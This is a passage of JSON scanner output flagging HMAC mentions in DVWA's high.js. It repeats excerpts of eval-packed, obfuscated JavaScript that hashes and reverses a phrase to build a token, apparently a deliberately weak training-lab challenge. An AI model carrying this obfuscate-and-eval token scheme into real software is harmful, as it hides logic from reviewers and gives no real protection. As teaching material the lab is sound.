22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7998,
        "endLocationLine": 1,
        "endLocationColumn": 8002
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8045,
        "endLocationLine": 1,
        "endLocationColumn": 8049
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "hmac",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\